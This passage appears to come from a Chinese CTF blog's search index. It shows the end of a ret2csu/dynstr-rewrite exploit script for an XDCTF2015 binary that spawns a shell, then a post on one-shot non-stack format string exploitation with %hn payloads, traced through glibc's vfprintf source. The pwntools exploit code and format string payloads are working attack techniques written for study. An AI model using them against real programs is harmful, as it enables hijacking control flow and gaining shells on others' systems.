rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)             <span class="comment"># rbp</span></span><br><span class="line">    payload += p64(call_got_addr) <span class="comment"># r12 = GOT 地址</span></span><br><span class="line">    payload += p64(rdi_val)       <span class="comment"># r13 = edi</span></span><br><span class="line">    payload += p64(rsi_val)       <span class="comment"># r14 = rsi</span></span><br><span class="line">    payload += p64(rdx_val)       <span class="comment"># r15 = rdx</span></span><br><span class="line">    payload += p64(gadget2)       <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13; call [r12+rbx*8]</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">7</span>         <span class="comment"># 对齐，模拟返回值保存现场</span></span><br><span class="line">    payload += p64(return_after_call) <span class="keyword">if</span> return_after_call <span class="keyword">else</span> <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;read&quot;</span>,<span class="string">b&quot;system&quot;</span>)</span><br><span class="line">dynstr = dynstr.replace(<span class="string">b&quot;stdout&quot;</span>,<span class="string">b&quot;stdo&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, strtab, <span class="number">0x98</span>, return_after_call=main))</span><br><span class="line">p.send(dynstr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,ret2csu(read_got, <span class="number">0</span>, data, <span class="number">8</span>, return_after_call=main))</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x78</span> + p64(ret) + p64(pop_rdi_ret) + p64(data) + p64(<span class="number">0x400546</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<p>但这种方法不是一直可以生效的，主要得看有没有可写的<strong>strtab</strong>。不如法一通用。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>非栈上格式化字符串一次利用</title>
    <url>/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h4 id="问题发展路径">问题发展路径</h4>
<ul>
<li>一开始最基本的格式化字符串漏洞任意地址写，没有什么限制</li>
<li>进阶一点的是非栈上的格式化字符串漏洞利用，需要利用到栈上的指向程序名称的链条以及靠近内核区域的链条，但这种方法正常而言需要多次格式化字符串漏洞的执行利用，对目标地址改动越大需要利用到越多次。</li>
<li>最后是在读取内容非栈上的情况下，实现在一次格式化字符串漏洞的触发中直接进行对一个栈上地址的两个字节的修改，可以用于减少利用格式化字符串漏洞的次数，绕过更多的限制。</li>
</ul>
<h4 id="实现原理">实现原理</h4>
<p>比如我们假设程序中有后门函数，目标是把栈上的返回地址的后两个字节给覆盖了以实现返回到后门函数中去。其中要利用到的两个链条的偏移分别为15和45。按照一般的多次漏洞的利用来说，是要先通过覆盖偏移15处的<code>0x7ffd991d220e</code>的低两个字节<code>0x220e</code>为<code>0x1898</code>，这样以后在r12指向的偏移45处就会是一个指针直接指向要返回到的地址，然后再通过写偏移45处内容的低两个字节实现对返回地址的低两个字节的写入。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001001143123.png"
                      class=""
                >
<p>这里我们很容易就想到尝试直接把两个并到一起写，就有了如下payload：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;part1&#125;</span>c%15$hn&quot;</span> + <span class="string">f&quot;%<span class="subst">&#123;part2&#125;</span>c%45$hn&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>但在实际调试过后会发现现实的残酷，这个格式化字符串的解析中并不是按照先来后到的顺序，先解析完前一个再解析后一个的。实际上这里改的内容都是原偏移地址处指针指向的内容，最后并不会对返回地址进行修改。</p>
<p>于是就有如下的比较神奇的绕过方法，就可以通过格式化字符串参数解析的特性来实现逐级的赋值。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;%p&quot;</span>*<span class="number">13</span></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;part1-<span class="number">130</span>-<span class="number">0x8</span>&#125;</span>c%hn&quot;</span> + <span class="string">f&quot;%<span class="subst">&#123;part2&#125;</span>c%45$hn&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>这里省略掉了<code>%x$n</code>这种组合，而是直接<code>%hn</code>，这样省略以后会根据顺序来确定指定的参数偏移，由于前面有14个%，这里的%实际就会被解析为指向偏移15处的参数，这样一来在%的解析阶段就能把指定内容写到偏移15的指针处，从而与后面的内容进行联动，实现栈上内容的低两个字节内容的修改。这里part1就是我们通过泄露出栈相关地址后，计算出的返回地址在栈上位置的后两个字节。减去130是前面13个%p打印出的内容长度，最后的减0x8是调试后测出来的差值（这个的确不知道是在哪里多的内容）。</p>
<h4 id="源码分析">源码分析</h4>
<p>首先在<code>stdio-common/printf.c</code>中可以找到printf的具体实现。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libioP.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> printf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write formatted output to stdout from the format string FORMAT.  */</span></span><br><span class="line"><span class="comment">/* VARARGS1 */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list arg;				<span class="comment">//声明一个 va_list 类型的变量 arg，用于存储可变参数列表。</span></span><br><span class="line">  <span class="type">int</span> done;					<span class="comment">//写入的字符数或其他状态信息。</span></span><br><span class="line"></span><br><span class="line">  va_start (arg, format);	<span class="comment">//初始化 arg，使其指向可变参数列表的第一个参数。</span></span><br><span class="line">  done = __vfprintf_internal (<span class="built_in">stdout</span>, format, arg, <span class="number">0</span>);</span><br><span class="line">  va_end (arg);				<span class="comment">//清理 arg，以释放相关资源</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_printf</span></span><br><span class="line">ldbl_strong_alias (__printf, <span class="built_in">printf</span>);</span><br><span class="line">ldbl_strong_alias (__printf, _IO_printf);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>其最核心的功能要到<code>vfprintf.c</code>中去寻找，这里结合gdb带源码调试。</p>
<p>首先会进入ARGCHECK中进行一系列检测，确保格式字符串符合要求。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ARGCHECK(S, Format) \</span></span><br><span class="line"><span class="meta">  do									      \</span></span><br><span class="line"><span class="meta">    &#123;									      \</span></span><br><span class="line"><span class="meta">      <span class="comment">/* Check file argument for consistence.  */</span>			      \</span></span><br><span class="line"><span class="meta">      CHECK_FILE (S, -1);						 <span class="comment">//检查文件流有效性和状态     \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      if (S-&gt;_flags &amp; _IO_NO_WRITES)			//如果指定文件流不可写就返回错误		      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#123;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  S-&gt;_flags |= _IO_ERR_SEEN;					      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  __set_errno (EBADF);						      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  return -1;							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#125;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      if (Format == NULL)			//如果格式化字符串为空就返回错误			      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#123;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  __set_errno (EINVAL);						      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	  return -1;							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">	&#125;								      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">    &#125; while (0)</span></span></span><br></pre></td></tr></table></figure></div>
<p>然后会检查文件流 <code>s</code>
是否处于无缓冲模式，如果处于无缓冲模式，代码调用一个辅助函数
<code>buffered_vfprintf</code>。这个函数的作用是为该流分配一个局部临时缓冲区，然后重新调用原来的格式化输出函数。这样可以在处理输出时提供一个缓冲层，即使原始流不支持缓冲。这里我们调试时会进到<code>buffered_vfprintf</code>里面，最后实际还会调用回<code>vfprintf</code>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (UNBUFFERED_P (s))</span><br><span class="line"><span class="comment">/* Use a helper function which will allocate a local temporary buffer</span></span><br><span class="line"><span class="comment">   for the stream and then call us again.  */</span></span><br><span class="line">	<span class="keyword">return</span> buffered_vfprintf (s, format, ap, mode_flags);</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001102135414.png"
                      class=""
                >
<p>然后会判断代码是否支持宽字符的处理，然后查找格式字符串中的第一个格式说明符。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">  <span class="comment">/* Find the first format specifier.  */</span></span><br><span class="line">  f = lead_str_end = __find_specwc ((<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">/* Find the first format specifier.  */</span></span><br><span class="line">  f = lead_str_end = __find_specmb ((<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
<p>后面也有类似的，但是会自增f，用于逐个解析。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get current character in format string.  */</span></span><br><span class="line">      JUMP (*++f, step0_jumps);</span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">      f = __find_specwc ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      f = __find_specmb ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Write the following constant string.  */</span></span><br><span class="line">      outstring (end_of_spec, f - end_of_spec);</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> outstring(String, Len)						\</span></span><br><span class="line"><span class="meta">  do									\</span></span><br><span class="line"><span class="meta">    &#123;									\</span></span><br><span class="line"><span class="meta">      const void *string_ = (String);					\</span></span><br><span class="line"><span class="meta">      done = outstring_func (s, string_, (Len), done);			\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (done &lt; 0)							\</span></span><br><span class="line"><span class="meta">	goto all_done;							\</span></span><br><span class="line"><span class="meta">    &#125;									\</span></span><br><span class="line"><span class="meta">   while (0)</span></span><br></pre></td></tr></table></figure></div>
<p>我们现在关注那个指向程序名的链条，栈上地址低3位16进制为288。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001112058996.png"
                      class=""
                >
<p>之后在调试时会发现，f会逐渐自增解析各个格式化字符串中的内容，在解析一串%p时其实不会在每一次outstring中打印内容，而是在解析到<code>%xxxc</code>后一并打印内容出来。之后在解析%hn时，会到这里进行跳转。这里对各种类型修饰符进行了解析</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* Process &#x27;h&#x27; modifier.  There might another &#x27;h&#x27; following.  */</span></span><br><span class="line">LABEL (mod_half):</span><br><span class="line">  is_short = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step3a_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;hh&#x27; modifier.  */</span></span><br><span class="line">LABEL (mod_halfhalf):</span><br><span class="line">  is_short = <span class="number">0</span>;</span><br><span class="line">  is_char = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;l&#x27; modifier.  There might another &#x27;l&#x27; following.  */</span></span><br><span class="line">LABEL (mod_long):</span><br><span class="line">  is_long = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step3b_jumps);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process &#x27;L&#x27;, &#x27;q&#x27;, or &#x27;ll&#x27; modifier.  No other modifier is</span></span><br><span class="line"><span class="comment"> allowed to follow.  */</span></span><br><span class="line">LABEL (mod_longlong):</span><br><span class="line">  is_long_double = <span class="number">1</span>;</span><br><span class="line">  is_long = <span class="number">1</span>;</span><br><span class="line">  JUMP (*++f, step4_jumps);</span><br></pre></td></tr></table></figure></div>
<p><strong>处理 <code>h</code> 修饰符</strong>：</p>
<ul>
<li><code>LABEL (mod_half)</code>
<ul>
<li>当遇到 <code>h</code> 修饰符时，将 <code>is_short</code> 设置为
1，表示后续的参数应被视为 <code>short int</code> 类型。</li>
<li>然后跳转到下一个处理步骤
<code>step3a_jumps</code>，继续解析后续的格式字符。</li>
</ul></li>
</ul>
<p><strong>处理 <code>hh</code> 修饰符</strong>：</p>
<ul>
<li><code>LABEL (mod_halfhalf)</code>
<ul>
<li>当遇到 <code>hh</code> 修饰符时，设置 <code>is_short</code> 为
0，并将 <code>is_char</code> 设置为 1。这表示后续参数将被视为
<code>unsigned char</code> 类型。</li>
<li>跳转到 <code>step4_jumps</code>，继续后续解析。</li>
</ul></li>
</ul>
<p><strong>处理 <code>l</code> 修饰符</strong>：</p>
<ul>
<li><code>LABEL (mod_long)</code>
<ul>
<li>当遇到 <code>l</code> 修饰符时，将 <code>is_long</code> 设置为
1，表示后续的参数应被视为 <code>long int</code> 类型。</li>
<li>跳转到 <code>step3b_jumps</code>，继续解析。</li>
</ul></li>
</ul>
<p><strong>处理 <code>L</code>、<code>q</code> 或 <code>ll</code>
修饰符</strong>：</p>
<ul>
<li><code>LABEL (mod_longlong)</code>
<ul>
<li>当遇到 <code>L</code>、<code>q</code> 或 <code>ll</code>
修饰符时，将 <code>is_long_double</code> 设置为 1，并将
<code>is_long</code> 设置为 1。这表明后续参数应被视为
<code>long double</code> 类型或 <code>long long int</code> 类型。</li>
<li>这个标签后不允许有其他修饰符，因此跳转到
<code>step4_jumps</code>，继续后续解析。</li>
</ul></li>
</ul>
<p>解析完成后，我们发现栈上的内容实际已经被修改了，而后面的内容还没有开始解析。所以在%hn这种方式进行解析后会直接写入目标地址。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001113356649.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001113519869.png"
                      class=""
                >
<p>之后解析到$时会跳转到<code>do_positional</code>进行进一步操作，然后会调用printf_positional进行进一步操作。这边如果步过就能直接完成操作了。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (*f == L_(<span class="string">&#x27;$&#x27;</span>))</span><br><span class="line"><span class="comment">/* Oh, oh.  The argument comes from a positional parameter.  */</span></span><br><span class="line">	<span class="keyword">goto</span> do_positional;</span><br><span class="line">JUMP (*f, step1_jumps);</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">do_positional:</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep, mode_flags);</span><br></pre></td></tr></table></figure></div>
<p>现在我们来看看用<code>payload = f"%&#123;part1&#125;c%15$hn" + f"%&#123;part2&#125;c%45$hn"</code>这个会发生什么。首先在前面<code>%xxxc</code>会直接打印占位符，同样的，我们现在关注指向程序名的链条。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001120346608.png"
                      class=""
                >
<p>程序在解析<code>%&#123;part1&#125;c%15$hn</code>时，会进入<code>printf_positional</code>进行进一步处理，其中解析的核心函数是
<code>nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</code>
然后会发现解析完前面的内容之后，栈上那个指向程序名的指针并没有被改变。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001120419249.png"
                      class=""
                >
<p>当解析完最后一个之后，会进入如下两个switch分支：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nspecs; ++cnt)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If the width is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].width_arg != <span class="number">-1</span>)</span><br><span class="line">	args_type[specs[cnt].width_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If the precision is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].prec_arg != <span class="number">-1</span>)</span><br><span class="line">	args_type[specs[cnt].prec_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">switch</span> (specs[cnt].ndata_args)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:		<span class="comment">/* No arguments.  */</span></span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:		<span class="comment">/* One argument; we already have the</span></span><br><span class="line"><span class="comment">			   type and size.  */</span></span><br><span class="line">	  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;</span><br><span class="line">	  args_size[specs[cnt].data_arg] = specs[cnt].size;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">	  <span class="comment">/* We have more than one argument for this format spec.</span></span><br><span class="line"><span class="comment">	     We must call the arginfo function again to determine</span></span><br><span class="line"><span class="comment">	     all the types.  */</span></span><br><span class="line">	  (<span class="type">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class="line">	    (&amp;specs[cnt].info,</span><br><span class="line">	     specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class="line">	     &amp;args_size[specs[cnt].data_arg]);</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">--------------------------------------------------------------------------------------------------</span><br><span class="line">      <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nargs; ++cnt)</span><br><span class="line">    <span class="keyword">switch</span> (args_type[cnt])</span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T(tag, mem, type)				\</span></span><br><span class="line"><span class="meta">	case tag:					\</span></span><br><span class="line"><span class="meta">	  args_value[cnt].mem = va_arg (*ap_savep, type); \</span></span><br><span class="line"><span class="meta">	  break</span></span><br><span class="line"></span><br><span class="line">	T (PA_WCHAR, pa_wchar, <span class="type">wint_t</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_CHAR:				<span class="comment">/* Promoted.  */</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_SHORT:		<span class="comment">/* Promoted.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == INT_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	T (PA_INT, pa_int, <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == LONG_LONG_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	T (PA_INT|PA_FLAG_LONG_LONG, pa_long_long_int, <span class="type">long</span> <span class="type">long</span> <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX != INT_MAX &amp;&amp; LONG_MAX != LONG_LONG_MAX</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> <span class="string">&quot;he?&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">case</span> PA_FLOAT:				<span class="comment">/* Promoted.  */</span></span><br><span class="line">	T (PA_DOUBLE, pa_double, <span class="type">double</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_DOUBLE|PA_FLAG_LONG_DOUBLE:</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    args_value[cnt].pa_double = va_arg (*ap_savep, <span class="type">double</span>);</span><br><span class="line">	    args_type[cnt] &amp;= ~PA_FLAG_LONG_DOUBLE;</span><br><span class="line">	  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __HAVE_FLOAT128_UNLIKE_LDBL</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ((mode_flags &amp; PRINTF_LDBL_USES_FLOAT128) != <span class="number">0</span>)</span><br><span class="line">	  args_value[cnt].pa_float128 = va_arg (*ap_savep, <span class="type">_Float128</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  args_value[cnt].pa_long_double = va_arg (*ap_savep, <span class="type">long</span> <span class="type">double</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> PA_STRING:				<span class="comment">/* All pointers are the same */</span></span><br><span class="line">      <span class="keyword">case</span> PA_WSTRING:			<span class="comment">/* All pointers are the same */</span></span><br><span class="line">	T (PA_POINTER, pa_pointer, <span class="type">void</span> *);</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> T</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">	<span class="keyword">if</span> ((args_type[cnt] &amp; PA_FLAG_PTR) != <span class="number">0</span>)</span><br><span class="line">	  args_value[cnt].pa_pointer = va_arg (*ap_savep, <span class="type">void</span> *);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (__glibc_unlikely (__printf_va_arg_table != <span class="literal">NULL</span>)</span><br><span class="line">		 &amp;&amp; __printf_va_arg_table[args_type[cnt] - PA_LAST] != <span class="literal">NULL</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">	    args_value[cnt].pa_user = alloca (args_size[cnt]);</span><br><span class="line">	    (*__printf_va_arg_table[args_type[cnt] - PA_LAST])</span><br><span class="line">	      (args_value[cnt].pa_user, ap_savep);</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  <span class="built_in">memset</span> (&amp;args_value[cnt], <span class="number">0</span>, <span class="keyword">sizeof</span> (args_value[cnt]));</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">	<span class="comment">/* Error case.  Not all parameters appear in N$ format</span></span><br><span class="line"><span class="comment">	   strings.  We have no way to determine their type.  */</span></span><br><span class="line">	assert ((mode_flags &amp; PRINTF_FORTIFY) != <span class="number">0</span>);</span><br><span class="line">	__libc_fatal (<span class="string">&quot;*** invalid %N$ use detected ***\n&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>第一个
<code>switch</code></strong>：解析格式说明符并确定各个参数的类型和大小，建立参数类型映射。</p>
<p><strong>第二个
<code>switch</code></strong>：根据映射提取实际参数，确保能够正确处理可变参数列表，确保每个参数的类型和大小都被正确使用。</p>
<p>最后会统一处理格式化说明符。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Now walk through all format specifiers and process them.  */</span></span><br><span class="line">  <span class="keyword">for</span> (; (<span class="type">size_t</span>) nspecs_done &lt; nspecs; ++nspecs_done)</span><br><span class="line">    &#123;</span><br><span class="line">      ..............................</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001121745055.png"
                      class=""
                >
<p>这里步过一次后会跳转到这个位置，我们能发现rcx被指向了./pwn，也就是第一次15偏移处的位置，执行两次后就把原来指向程序名的指针修改了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001122059746.png"
                      class=""
                >
<p>之后再处理后，会发现改的是原来的的内容，<code>./</code>被改成了<code>\x08\x12</code>。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001123259237.png"
                      class=""
                >
<p>分析到这其实大体原理已经清晰了，如果硬要从源码分析的话也定位到了相关函数，但感觉再分析下去效率太低了，以后有研究的需求再深入分析吧。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>format string</tag>
      </tags>
  </entry>
</search>
